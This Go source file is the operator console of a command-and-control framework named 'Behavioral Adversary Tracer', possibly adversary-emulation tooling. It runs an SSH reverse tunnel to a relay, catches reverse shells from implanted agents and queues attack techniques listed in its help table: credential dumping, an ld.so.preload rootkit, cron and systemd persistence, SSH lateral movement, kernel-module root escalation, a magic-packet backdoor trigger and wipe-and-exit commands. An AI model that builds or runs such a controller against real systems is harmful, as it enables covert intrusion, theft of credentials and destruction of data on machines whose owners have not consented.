package main

import (
	"crypto/sha256"
	"flag"
	"fmt"
	"io"
	"net"
	"os"
	"os/exec"
	"os/signal"
	"strconv"
	"strings"
	"sync"
	"syscall"
	"time"

	"github.com/chzyer/readline"

	"core/mon/internal/config"
	"core/mon/internal/server"
)

//  ANSI palette                                                            
const (
	clrReset = "\033[0m"
	clrBold  = "\033[1m"
	clrDim   = "\033[2m"
	clrGray  = "\033[90m"   // dark gray
	clrWhite = "\033[97m"   // bright white
	clrBoldW = "\033[1;97m" // bold bright white
)

//  Banner art                                                              

// iconArt is the project silhouette (do not alter dimensions).
const iconArt = `                          .
 :*                      %
  *%                   =@=
  :@@=                =@@.
   @@@+              %@@*
   :@@@@    :  -   :@@@@.
    @@@@@   @++@   @@@@@
    @@@@@.. @@@@ -:@@@@@
   :@@@@@*%+*@@-*#@@@@@@
   :@@@@@@=@#-+%@:@@@@@@:
     ++@@@+%@@@@##@@@+=
        @@@+@@@@-@@@
        %@@-@@@%*@@=
         =+@*@@=@+=
           --@@-
             *+-
             :              `

const wordArt = `'||''|.       |     |''||''|
 ||   ||     |||       ||
 ||'''|.    |  ||      ||
 ||    ||  .''''|.     ||
.||...|'  .|.  .||.   .||. `

//  Secret reveal                                                            

type secretState struct {
	secret string
	out    io.Writer
}

// OnChange intercepts Ctrl+H (\x08) to reveal the full secret.
// On modern SSH sessions, backspace sends \x7f so \x08 is safe to override.
func (s *secretState) OnChange(line []rune, pos int, key rune) ([]rune, int, bool) {
	if key != 8 { // not Ctrl+H
		return line, pos, false
	}
	fmt.Fprintf(s.out, "\r  %ssecret%s   %s\n", clrGray, clrReset, clrWhite+s.secret+clrReset)
	return line, pos, true
}

//  Banner                                                                    

func printBanner(out io.Writer, listenAddr, secret, keyPath string) {
	const termWidth = 102

	//  Icon art centered                                                    
	iconLines := strings.Split(iconArt, "\n")
	maxIcon := 0
	for _, l := range iconLines {
		if w := len(strings.TrimRight(l, " ")); w > maxIcon {
			maxIcon = w
		}
	}
	iconPad := (termWidth - maxIcon) / 2
	if iconPad < 0 {
		iconPad = 0
	}
	iconPrefix := strings.Repeat(" ", iconPad)

	fmt.Fprintln(out)
	for _, l := range iconLines {
		if strings.TrimSpace(l) == "" {
			fmt.Fprintln(out)
		} else {
			fmt.Fprintf(out, "%s%s%s%s\n", iconPrefix, clrGray, l, clrReset)
		}
	}

	//  BAT wordart centered                                                  
	wordLines := strings.Split(wordArt, "\n")
	maxWord := 0
	for _, l := range wordLines {
		if len(l) > maxWord {
			maxWord = len(l)
		}
	}
	wordPad := (termWidth - maxWord) / 2
	if wordPad < 0 {
		wordPad = 0
	}
	wordPrefix := strings.Repeat(" ", wordPad)

	fmt.Fprintln(out)
	for _, l := range wordLines {
		fmt.Fprintf(out, "%s%s\n", wordPrefix, l)
	}

	//  Title + signature centered                                            
	const (
		toolName = "Behavioral Adversary Tracer"
		version  = "v1.48"
		sig      = "by rhzv0"
	)
	titleVis := toolName + "  " + version
	titlePad := (termWidth - len(titleVis)) / 2
	if titlePad < 0 {
		titlePad = 0
	}
	sigPad := (termWidth - len(sig)) / 2
	if sigPad < 0 {
		sigPad = 0
	}

	fmt.Fprintln(out)
	fmt.Fprintf(out, "%s%s%s  %s%s%s\n",
		strings.Repeat(" ", titlePad),
		clrBoldW, toolName, clrGray, version, clrReset)
	fmt.Fprintf(out, "%s%s%s%s\n",
		strings.Repeat(" ", sigPad),
		clrGray, sig, clrReset)

	//  Info section                                                          
	relayHost, c2Port, kccPort := "", "9443", "9444"
	if config.KCCAddr != "" {
		if h, p, err := net.SplitHostPort(config.KCCAddr); err == nil {
			relayHost, kccPort = h, p
		}
	}
	if relayHost == "" && config.FallbackServer != "" {
		if h, _, err := net.SplitHostPort(config.FallbackServer); err == nil {
			relayHost = h
		}
	}
	if config.DefaultServer != "" {
		if _, p, err := net.SplitHostPort(config.DefaultServer); err == nil && p != "" {
			c2Port = p
		}
	}
	_, listenPort, _ := net.SplitHostPort(listenAddr)

	secretSnip := secret
	if len(secretSnip) > 8 {
		secretSnip = secretSnip[:8] + "···"
	}

	lbl := func(s string) string { return clrGray + s + clrReset }
	val := func(s string) string { return clrWhite + s + clrReset }

	fmt.Fprintln(out)
	fmt.Fprintf(out, "  %s   %s\n", lbl("listen"), val(":"+listenPort))
	if relayHost != "" {
		fmt.Fprintf(out, "  %s    %s\n", lbl("relay"), val(relayHost))
		fmt.Fprintf(out, "  %s%s\n", lbl("   ├ c2    "), val(":"+c2Port))
		fmt.Fprintf(out, "  %s%s\n", lbl("   ├ kcc   "), val(":"+kccPort))
		fmt.Fprintf(out, "  %s%s\n", lbl("   └ shell "), val(":4445"))
	}
	if keyPath != "" {
		fmt.Fprintf(out, "  %s      %s\n", lbl("key"), val(keyPath))
	}
	fmt.Fprintf(out, "  %s   %s   %s\n",
		lbl("secret"), secretSnip, clrGray+"^H"+clrReset)
	fmt.Fprintln(out)
}

// stdinIsTTY returns true when stdin is an interactive terminal.
// Checks /proc/self/fd/0 symlink target: /dev/null or pipes are not TTYs.
func stdinIsTTY() bool {
	target, err := os.Readlink("/proc/self/fd/0")
	if err != nil {
		return false
	}
	// /dev/null, /dev/zero, pipe:[], socket:[] are not TTYs.
	// Real terminals appear as /dev/pts/N or /dev/ttyN.
	return strings.HasPrefix(target, "/dev/pts/") || strings.HasPrefix(target, "/dev/tty")
}

//  Tunnel state                                                            

type tunnelState struct {
	mu    sync.Mutex
	relay string
	key   string
	cmd   *exec.Cmd
}

func (t *tunnelState) start() {
	if t.relay == "" || t.key == "" {
		return
	}
	t.cmd = startTunnel(t.relay, t.key)
}

func (t *tunnelState) stop() {
	if t.cmd != nil && t.cmd.Process != nil {
		t.cmd.Process.Kill()
		t.cmd.Wait()
		t.cmd = nil
		fmt.Fprintln(os.Stderr, "[tunnel] stopped")
	}
}

func (t *tunnelState) restart() {
	t.stop()
	t.start()
}

//  Tunnel                                                                    

// startTunnel launches the SSH reverse tunnel (batrev) to the relay.
// relay: SSH target, e.g. "ubuntu@__RELAY_IP__" or "ubuntu@relay.example.com"
// key:   path to SSH private key
// Returns the child process; caller is responsible for killing it on exit.
func startTunnel(relay, key string) *exec.Cmd {
	logFile, _ := os.OpenFile("/tmp/batrev.log", os.O_CREATE|os.O_WRONLY|os.O_TRUNC, 0600)
	args := []string{
		"-i", key,
		"-R", "127.0.0.1:8443:localhost:9443",
		"-R", "0.0.0.0:9443:localhost:9443",
		"-R", "0.0.0.0:4445:localhost:4445",
		"-L", "8444:localhost:8444",
		"-N",
		"-o", "StrictHostKeyChecking=no",
		"-o", "ServerAliveInterval=30",
		"-o", "ServerAliveCountMax=3",
		relay,
	}
	cmd := exec.Command("ssh", args...)
	if logFile != nil {
		cmd.Stdout = logFile
		cmd.Stderr = logFile
	}
	if err := cmd.Start(); err != nil {
		fmt.Fprintf(os.Stderr, "[tunnel] start error: %v\n", err)
		if logFile != nil {
			logFile.Close()
		}
		return nil
	}
	fmt.Fprintf(os.Stderr, "[tunnel] → %s  pid=%d  log=/tmp/batrev.log\n", relay, cmd.Process.Pid)
	return cmd
}

//  main                                                                      

func main() {
	listenAddr := flag.String("listen", "0.0.0.0:9443", "listen address (host:port)")
	relayArg := flag.String("relay", "", "SSH relay target override, e.g. ubuntu@relay.example.com")
	keyArg := flag.String("key", "", "SSH key path override (default: $BAT_KEY or /k/ubu2.pem)")
	flag.Parse()

	secret := config.SharedSecret
	srv := server.New(secret)

	//  Derive relay + key                                                    
	relayTarget := *relayArg
	if relayTarget == "" {
		// auto-derive from baked config
		relayHost := ""
		if config.KCCAddr != "" {
			if h, _, err := net.SplitHostPort(config.KCCAddr); err == nil {
				relayHost = h
			}
		}
		if relayHost == "" && config.FallbackServer != "" {
			if h, _, err := net.SplitHostPort(config.FallbackServer); err == nil {
				relayHost = h
			}
		}
		if relayHost == "" && config.DefaultServer != "" {
			if h, _, err := net.SplitHostPort(config.DefaultServer); err == nil {
				relayHost = h
			}
		}
		if relayHost != "" {
			relayTarget = "ubuntu@" + relayHost
		}
	}

	sshKey := *keyArg
	if sshKey == "" {
		sshKey = config.SSHKey
	}
	if sshKey == "" {
		sshKey = os.Getenv("BAT_KEY")
	}

	//  Auto-tunnel                                                          
	tun := &tunnelState{relay: relayTarget, key: sshKey}
	if relayTarget != "" {
		tun.start()
	}

	// Tear down tunnel on signal.
	sigCh := make(chan os.Signal, 1)
	signal.Notify(sigCh, syscall.SIGTERM, syscall.SIGINT)
	go func() {
		<-sigCh
		tun.stop()
		os.Exit(0)
	}()

	go func() {
		if err := srv.ListenAndServeTLS(*listenAddr); err != nil {
			if !strings.Contains(err.Error(), "use of closed") {
				fmt.Fprintf(os.Stderr, "[fatal] %v\n", err)
				tun.stop()
				os.Exit(1)
			}
		}
	}()

	// Headless mode: when stdin is not a real TTY (e.g., /dev/null, pipe),
	// skip readline and log server events to stdout indefinitely.
	if !stdinIsTTY() {
		go func() {
			for msg := range srv.Results() {
				fmt.Println(msg)
			}
		}()
		select {} // block forever; kill via SIGTERM
	}

	ss := &secretState{secret: secret, out: os.Stderr}
	rl := newReadline(srv, ss)
	defer rl.Close()

	go func() {
		for msg := range srv.Results() {
			fmt.Println(msg)
			if !strings.HasPrefix(msg, "[agent connected]") {
				fmt.Fprintf(rl.Stdout(), "\r%s\n", msg)
			}
		}
	}()

	printBanner(rl.Stdout(), *listenAddr, secret, tun.key)
	fmt.Fprint(rl.Stdout(), server.FormatAgentTable(srv.ListAgents()))
	fmt.Fprintln(rl.Stdout())

	for {
		line, err := rl.Readline()
		if err != nil {
			break
		}
		line = strings.TrimSpace(line)
		if line == "" {
			continue
		}
		if line == "!exit" || line == "quit" || line == "exit" {
			fmt.Fprintln(rl.Stdout(), "  shutting down")
			srv.Close()
			tun.stop()
			os.Exit(0)
		}
		handleCommand(rl, srv, line, secret, *listenAddr, tun)
	}
}

// newReadline creates a styled readline instance.
func newReadline(srv *server.Server, ss *secretState) *readline.Instance {
	cfg := &readline.Config{
		// \x01 / \x02 bracket non-printing chars so readline tracks display width correctly.
		Prompt:            "\x01" + clrGray + "\x02bat\x01" + clrReset + "\x02> ",
		HistoryFile:       "/tmp/.bat_history",
		AutoComplete:      &completer{srv: srv},
		InterruptPrompt:   "^C",
		EOFPrompt:         "exit",
		HistorySearchFold: true,
		Stdout:            os.Stderr,
		Listener:          ss,
	}
	rl, err := readline.NewEx(cfg)
	if err != nil {
		fmt.Fprintf(os.Stderr, "[server] readline init error: %v\n", err)
		os.Exit(1)
	}
	return rl
}

//  Tab completion                                                            

type completer struct{ srv *server.Server }

func (c *completer) Do(line []rune, pos int) (newLine [][]rune, length int) {
	str := string(line[:pos])
	parts := strings.Fields(str)

	agentCmds := map[string]bool{
		"ttp": true, "pl": true, "shell": true, "spec": true,
		"rename": true, "root": true, "stealth-status": true,
		"stealth-unload": true, "compile": true, "kill": true, "destruct": true,
		"mrk": true, "umrk": true, "rm": true,
	}
	if len(parts) >= 1 && agentCmds[parts[0]] {
		typing := ""
		if len(parts) >= 2 {
			typing = parts[len(parts)-1]
		}
		if strings.HasPrefix(typing, "@") || (len(parts) == 1 && strings.HasSuffix(str, " ")) {
			prefix := ""
			if strings.HasPrefix(typing, "@") {
				prefix = typing[1:]
			}
			for _, a := range c.srv.ListAgents() {
				label := a.ID
				if a.Name != "" {
					label = a.Name
				}
				if strings.HasPrefix(label, prefix) {
					newLine = append(newLine, []rune("@"+label+" ")[len(typing):])
				}
			}
			if len(parts) == 1 || parts[0] == "ttp" {
				if strings.HasPrefix("all", prefix) {
					newLine = append(newLine, []rune("@all ")[len(typing):])
				}
			}
			return newLine, len(typing)
		}
	}

	cmds := []string{
		"ls", "grep ", "results", "clear", "help", "!exit",
		"ttp ", "pl ", "shell ", "spec ", "rename ",
		"root ", "stealth-status ", "stealth-unload ", "compile ",
		"mrk ", "umrk ", "rm ", "flush", "key ",
		"inject", "trigger ", "destruct", "kill",
	}
	typing := ""
	if len(parts) == 0 || (len(parts) == 1 && !strings.HasSuffix(str, " ")) {
		if len(parts) == 1 {
			typing = parts[0]
		}
		for _, cmd := range cmds {
			if strings.HasPrefix(cmd, typing) {
				newLine = append(newLine, []rune(cmd)[len(typing):])
			}
		}
		return newLine, len(typing)
	}
	return nil, 0
}

//  Command dispatch                                                          

func handleCommand(rl *readline.Instance, srv *server.Server, line, secret, listenAddr string, tun *tunnelState) {
	out := rl.Stdout()
	rawParts := strings.SplitN(line, " ", 3)
	cmd := rawParts[0]
	parts := strings.Fields(line)
	args := parts[1:]

	switch cmd {

	case "clear":
		// Full clear: erase screen + scrollback, then reprint banner + fresh ls.
		fmt.Fprint(out, "\033[H\033[2J\033[3J")
		printBanner(out, listenAddr, secret, tun.key)
		fmt.Fprint(out, server.FormatAgentTable(srv.ListAgents()))
		fmt.Fprintln(out)

	case "ls":
		fmt.Fprint(out, server.FormatAgentTable(srv.ListAgents()))

	case "grep":
		if len(args) == 0 {
			fmt.Fprintln(out, "  usage: grep <pattern>")
			return
		}
		pat := strings.ToLower(strings.Join(args, " "))
		var filtered []*server.Agent
		for _, a := range srv.ListAgents() {
			haystack := strings.ToLower(a.ID + " " + a.Name + " " + a.IP + " " + a.Hostname + " " + a.OS)
			if strings.Contains(haystack, pat) {
				filtered = append(filtered, a)
			}
		}
		fmt.Fprint(out, server.FormatAgentTable(filtered))

	case "rm":
		if len(args) < 1 || !strings.HasPrefix(args[0], "@") {
			fmt.Fprintln(out, "  usage: rm @id")
			return
		}
		agentID := srv.ResolveID(args[0][1:])
		if agentID == "" {
			fmt.Fprintf(out, "  agent not found: %s\n", args[0])
			return
		}
		srv.RemoveAgent(agentID)
		fmt.Fprintf(out, "  %s removed\n", args[0])

	case "flush":
		n := srv.FlushAgents()
		fmt.Fprintf(out, "  %d agent(s) removed\n", n)

	case "key":
		if len(args) == 0 {
			fmt.Fprintf(out, "  key: %s\n", tun.key)
			return
		}
		newKey := args[0]
		if _, err := os.Stat(newKey); err != nil {
			fmt.Fprintf(out, "  key: file not found: %s\n", newKey)
			return
		}
		tun.mu.Lock()
		tun.key = newKey
		tun.mu.Unlock()
		tun.restart()
		fmt.Fprintf(out, "  key → %s\n", newKey)

	case "ttp":
		if len(args) < 2 {
			fmt.Fprintln(out, "  usage: ttp @id <N> [params]")
			return
		}
		agentID, isAll, rest := resolveTarget(args, srv)
		if !isAll && agentID == "" {
			fmt.Fprintf(out, "  agent not found: %s\n", args[0])
			return
		}
		if len(rest) == 0 {
			fmt.Fprintln(out, "  usage: ttp @id <N> [params]")
			return
		}
		n, err := strconv.Atoi(rest[0])
		if err != nil {
			fmt.Fprintf(out, "  invalid TTP: %s\n", rest[0])
			return
		}
		params := strings.Join(rest[1:], " ")
		if isAll {
			srv.QueueTTP(n, params, "")
			fmt.Fprintf(out, "  %sTTP %d%s queued for all\n", clrGray, n, clrReset)
		} else {
			srv.QueueTTP(n, params, agentID)
			fmt.Fprintf(out, "  %sTTP %d%s → %s\n", clrGray, n, clrReset, args[0])
		}

	case "pl":
		if len(rawParts) < 3 {
			fmt.Fprintln(out, "  usage: pl @id @/path/script.sh  or  pl @id \"command\"")
			return
		}
		targetArg := strings.Fields(rawParts[1])[0]
		if !strings.HasPrefix(targetArg, "@") {
			fmt.Fprintln(out, "  usage: pl @id ...")
			return
		}
		target := targetArg[1:]
		var agentID string
		var isAll bool
		if strings.ToLower(target) == "all" {
			isAll = true
		} else {
			agentID = srv.ResolveID(target)
			if agentID == "" {
				fmt.Fprintf(out, "  agent not found: @%s\n", target)
				return
			}
		}
		payload := strings.TrimSpace(rawParts[2])
		var shellCmd string
		if strings.HasPrefix(payload, "@") {
			data, err := os.ReadFile(payload[1:])
			if err != nil {
				fmt.Fprintf(out, "  cannot read file: %v\n", err)
				return
			}
			shellCmd = string(data)
		} else {
			shellCmd = strings.Trim(payload, "\"'")
		}
		if isAll {
			srv.QueueTTP(4, shellCmd, "")
			fmt.Fprintln(out, "  payload queued for all")
		} else {
			srv.QueueTTP(4, shellCmd, agentID)
			fmt.Fprintf(out, "  payload queued → @%s\n", target)
		}

	case "shell":
		if len(args) < 1 || !strings.HasPrefix(args[0], "@") {
			fmt.Fprintln(out, "  usage: shell @id")
			return
		}
		agentID := srv.ResolveID(args[0][1:])
		if agentID == "" {
			fmt.Fprintf(out, "  agent not found: %s\n", args[0])
			return
		}
		doShell(rl, srv, agentID, args[0])

	case "spec":
		if len(args) < 1 || !strings.HasPrefix(args[0], "@") {
			fmt.Fprintln(out, "  usage: spec @id")
			return
		}
		agentID := srv.ResolveID(args[0][1:])
		if agentID == "" {
			fmt.Fprintf(out, "  agent not found: %s\n", args[0])
			return
		}
		fmt.Fprint(out, srv.FormatAgentSpec(agentID))

	case "rename":
		if len(rawParts) < 3 || !strings.HasPrefix(strings.TrimSpace(rawParts[1]), "@") {
			fmt.Fprintln(out, "  usage: rename @id newname")
			return
		}
		target := strings.Fields(rawParts[1])[0][1:]
		agentID := srv.ResolveID(target)
		if agentID == "" {
			fmt.Fprintf(out, "  agent not found: @%s\n", target)
			return
		}
		newName := strings.Trim(strings.TrimSpace(rawParts[2]), "\"'")
		if newName == "" {
			fmt.Fprintln(out, "  name cannot be empty")
			return
		}
		srv.RenameAgent(agentID, newName)
		fmt.Fprintf(out, "  @%s → %s\n", target, newName)

	case "mrk":
		if len(args) < 1 || !strings.HasPrefix(args[0], "@") {
			fmt.Fprintln(out, "  usage: mrk @id")
			return
		}
		agentID := srv.ResolveID(args[0][1:])
		if agentID == "" {
			fmt.Fprintf(out, "  agent not found: %s\n", args[0])
			return
		}
		srv.PinAgent(agentID, true)
		fmt.Fprintf(out, "  %s pinned\n", args[0])

	case "umrk":
		if len(args) < 1 || !strings.HasPrefix(args[0], "@") {
			fmt.Fprintln(out, "  usage: umrk @id")
			return
		}
		agentID := srv.ResolveID(args[0][1:])
		if agentID == "" {
			fmt.Fprintf(out, "  agent not found: %s\n", args[0])
			return
		}
		srv.PinAgent(agentID, false)
		fmt.Fprintf(out, "  %s unpinned\n", args[0])

	case "root":
		if len(args) < 1 || !strings.HasPrefix(args[0], "@") {
			fmt.Fprintln(out, "  usage: root @id")
			return
		}
		agentID := srv.ResolveID(args[0][1:])
		if agentID == "" {
			fmt.Fprintf(out, "  agent not found: %s\n", args[0])
			return
		}
		srv.QueueTTP(1003, "", agentID)
		fmt.Fprintf(out, "  K-03 → %s\n", args[0])

	case "stealth-status":
		if len(args) < 1 || !strings.HasPrefix(args[0], "@") {
			fmt.Fprintln(out, "  usage: stealth-status @id")
			return
		}
		agentID := srv.ResolveID(args[0][1:])
		if agentID == "" {
			fmt.Fprintf(out, "  agent not found: %s\n", args[0])
			return
		}
		srv.QueueTTP(4, "cat /sys/kernel/cpu_qos_ctrl/qos_state 2>/dev/null || echo 'not active'", agentID)
		fmt.Fprintf(out, "  stealth-status → %s\n", args[0])

	case "stealth-unload":
		if len(args) < 1 || !strings.HasPrefix(args[0], "@") {
			fmt.Fprintln(out, "  usage: stealth-unload @id")
			return
		}
		agentID := srv.ResolveID(args[0][1:])
		if agentID == "" {
			fmt.Fprintf(out, "  agent not found: %s\n", args[0])
			return
		}
		srv.QueueTTP(1099, "", agentID)
		fmt.Fprintf(out, "  K-99 → %s\n", args[0])

	case "compile":
		if len(args) < 1 || !strings.HasPrefix(args[0], "@") {
			fmt.Fprintln(out, "  usage: compile @id")
			return
		}
		agentID := srv.ResolveID(args[0][1:])
		if agentID == "" {
			fmt.Fprintf(out, "  agent not found: %s\n", args[0])
			return
		}
		env := srv.GetAgentEnv(agentID)
		if env == nil || env.KernelVersion == "" {
			fmt.Fprintf(out, "  %s: no env report yet\n", args[0])
			return
		}
		arch := srv.GetAgentArch(agentID)
		kernelArch := server.GoArchToKernelArch(arch)
		fmt.Fprintf(out, "  %s[KCC]%s %s / %s ...\n", clrGray, clrReset, env.KernelVersion, kernelArch)
		go func(id, kver, karch string) {
			resp, err := server.CallKCC(kver, karch, "nohash")
			if err != nil {
				srv.PublishResult(fmt.Sprintf("[KCC] error @%s: %v", id, err))
				return
			}
			if resp.Status != "ok" {
				srv.PublishResult(fmt.Sprintf("[KCC] build failed @%s: %s", id, resp.Msg))
				return
			}
			koKB := len(resp.KOB64) * 3 / 4 / 1024
			srv.StoreKO(id, resp)
			srv.PublishResult(fmt.Sprintf("[KCC] ok @%s  %dkB  cached=%v  sha256=%s...",
				id, koKB, resp.Cached, resp.KOSha256[:16]))
		}(agentID, env.KernelVersion, kernelArch)

	case "inject":
		agentID, isAll, _ := resolveTarget(args, srv)
		if len(args) > 0 && !isAll && agentID == "" {
			fmt.Fprintf(out, "  agent not found: %s\n", args[0])
			return
		}
		srv.QueueTTP(11, "", agentID)
		if isAll || agentID == "" {
			fmt.Fprintln(out, "  inject queued for all")
		} else {
			fmt.Fprintf(out, "  inject → %s\n", args[0])
		}

	case "trigger":
		if len(args) < 1 {
			fmt.Fprintln(out, "  usage: trigger <targetIP>")
			return
		}
		const callbackPort = 9443
		h := sha256.Sum256([]byte(secret))
		var magicKey [8]byte
		copy(magicKey[:], h[:8])
		ln, err := srv.PrepareRawsockListener(callbackPort)
		if err != nil {
			fmt.Fprintf(out, "  listen error: %v\n", err)
			return
		}
		if err := srv.SendMagicPacket(args[0], magicKey, callbackPort); err != nil {
			ln.Close()
			fmt.Fprintf(out, "  send error: %v\n", err)
			return
		}
		fmt.Fprintf(out, "  magic packet → %s  waiting for rawsock ...\n", args[0])
		go srv.AcceptRawsockSession(ln, out, os.Stdin)

	case "destruct":
		agentID, isAll, _ := resolveTarget(args, srv)
		if len(args) > 0 && !isAll && agentID == "" {
			fmt.Fprintf(out, "  agent not found: %s\n", args[0])
			return
		}
		srv.QueueTTP(222, "", agentID)
		if isAll || agentID == "" {
			fmt.Fprintln(out, "  self-destruct queued for all")
		} else {
			fmt.Fprintf(out, "  destruct → %s\n", args[0])
		}

	case "kill":
		agentID, isAll, _ := resolveTarget(args, srv)
		if len(args) > 0 && !isAll && agentID == "" {
			fmt.Fprintf(out, "  agent not found: %s\n", args[0])
			return
		}
		srv.QueueTTP(99, "", agentID)
		if isAll || agentID == "" {
			fmt.Fprintln(out, "  kill queued for all")
		} else {
			fmt.Fprintf(out, "  kill → %s\n", args[0])
		}

	case "results":
		fmt.Fprint(out, server.FormatResultTable(srv.ListAgents()))

	case "help", "?":
		fmt.Fprint(out, helpText)

	default:
		fmt.Fprintf(out, "  %s: unknown command  (help)\n", cmd)
	}
}

func resolveTarget(args []string, srv *server.Server) (agentID string, isAll bool, rest []string) {
	if len(args) == 0 || !strings.HasPrefix(args[0], "@") {
		return "", false, args
	}
	target := args[0][1:]
	rest = args[1:]
	if strings.ToLower(target) == "all" {
		return "", true, rest
	}
	return srv.ResolveID(target), false, rest
}

//  Shell session                                                            

func doShell(rl *readline.Instance, srv *server.Server, agentID, displayID string) {
	out := rl.Stdout()
	const shellPort = 4445
	const waitTimeout = 60 * time.Second

	srv.QueueTTP(2, "", agentID)
	fmt.Fprintf(out, "  %s[shell]%s %s  waiting :%d  (%s)\n",
		clrGray, clrReset, displayID, shellPort, waitTimeout)

	ln, err := net.Listen("tcp", fmt.Sprintf(":%d", shellPort))
	if err != nil {
		fmt.Fprintf(out, "  [shell] listen error: %v\n", err)
		return
	}
	ln.(*net.TCPListener).SetDeadline(time.Now().Add(waitTimeout))

	conn, err := ln.Accept()
	ln.Close()
	if err != nil {
		if netErr, ok := err.(net.Error); ok && netErr.Timeout() {
			fmt.Fprintln(out, "  [shell] timeout")
		} else {
			fmt.Fprintf(out, "  [shell] accept error: %v\n", err)
		}
		return
	}
	defer conn.Close()

	fmt.Fprintf(out, "  [shell] connected %s\n\n", conn.RemoteAddr())
	// Shell prompt: gray "displayID# "   all visible chars in one gray block avoids
	// readline width miscalculation that caused # to flicker when typing.
	rl.SetPrompt("\x01" + clrGray + "\x02" + displayID + "# \x01" + clrReset + "\x02")

	socketDone := make(chan struct{})
	go func() {
		io.Copy(out, conn)
		close(socketDone)
	}()

	for {
		line, err := rl.Readline()
		if err != nil {
			break
		}
		select {
		case <-socketDone:
			fmt.Fprintln(out, "\n  [shell] closed by agent")
			goto done
		default:
		}
		if _, err := conn.Write([]byte(line + "\n")); err != nil {
			fmt.Fprintf(out, "\n  [shell] write error: %v\n", err)
			break
		}
	}
done:
	rl.SetPrompt("\x01" + clrGray + "\x02bat\x01" + clrReset + "\x02> ")
	fmt.Fprintln(out, "\n  [shell] ended")
}

//  Help                                                                      

const helpText = `
  NAVIGATION
    ls                          list agents
    grep <pattern>              filter by name / OS / IP / hostname
    results                     last TTP result per agent
    clear                       clear screen and reprint banner
    !exit                       exit

  AGENT
    ttp @id <N> [params]        queue TTP
    ttp @all <N> [params]       queue TTP for all agents
    pl  @id @/path/script.sh   run local script on agent
    pl  @id "command"           run inline command
    shell @id                   reverse shell  (Ctrl+C to exit)
    spec @id                    full agent spec
    rename @id newname          rename agent  (persists)

  MANAGEMENT
    mrk @id / umrk @id          pin / unpin in ls
    rm @id                      remove agent from list (reappears on next check-in)
    flush                       remove all agents from list
    key [/path]                 show or update SSH key path (restarts tunnel)

  K-SERIES
    root @id                    K-03: escalate uid→0 (signal 59)
    stealth-status @id          read sysfs status live
    stealth-unload @id          K-99: unload .ko
    compile @id                 KCC: build .ko for agent kernel

  ADVANCED
    inject [@id]                TTP 11: inject + rawsock exit
    trigger <targetIP>          wake rawsock (no agent needed)
    destruct [@id]              TTP 222: wipe + exit
    kill [@id]                  TTP 99: terminate

  TTP TABLE
    1    masquerade   prctl PR_SET_NAME                         T1036.005
    2    revshell     connect-back → :4445                      T1059.004
    4    shell_exec   sh -c <params>                            T1059.004
    6    persist      cron + systemd                            T1053,T1543
    7    creddump     shadow / SSH / env / AWS                  T1003,T1552
    10   rootkit      bat-rootkit.so via ld.so.preload          T1574.006
    11   inject       inject + rawsock, agent exits             T1055
    20   recon        ARP + :22 scan                            T1018,T1046
    21   ssh_harvest  SSH keys + known_hosts                    T1145
    22   lateral      SCP+exec via SSH                          T1021.004
    99   kill         silent exit
    222  destruct     wipe + exit
    1003 K-03         uid=0 via signal 59
    1099 K-99         unload .ko

`
